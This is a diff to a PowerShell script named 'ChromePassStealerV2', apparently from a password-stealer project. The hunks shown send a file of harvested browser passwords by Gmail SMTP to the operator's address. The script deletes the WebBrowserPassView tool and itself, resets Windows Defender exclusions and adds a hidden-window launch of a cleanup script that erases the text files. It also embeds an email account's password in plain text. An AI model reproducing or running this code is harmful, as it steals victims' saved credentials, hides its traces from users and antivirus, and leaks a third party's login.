@@ -17,7 +17,7 @@ $SMTPInfo.EnableSsl = $true
 $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('georgitest23@gmail.com', 'PiLoting$333') #Email with which you want to send information
 $ReportEmail = New-Object System.Net.Mail.MailMessage
 $ReportEmail.From = 'georgitest23@gmail.com' #Email in which you want to receice the information
-$ReportEmail.To.Add('georgi.petrov.malta@gmail.com') #Email in which you want to receive the information
+$ReportEmail.To.Add('georgitest23@gmail.com') #Email in which you want to receive the information
 $ReportEmail.Subject = 'ChromePassStealerV2'
 $ReportEmail.Body = 'Attached is your list of informations.'
 $ReportEmail.Attachments.Add('C:\Users\Public\Documents\passwords.txt')
@@ -37,4 +37,5 @@ Remove-Item WebBrowserPassView.exe
 Remove-Item ciaoV2.ps1
 Remove-MpPreference -ExclusionExtension exe -Force #Reset antivirus exception
 Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
+powershell.exe -noexit -windowstyle hidden -file fin.ps1 #Start final .ps1 file to delete all .txt files (because in this .ps1 .txt files are considerated in-use
 exit #End .ps1 file
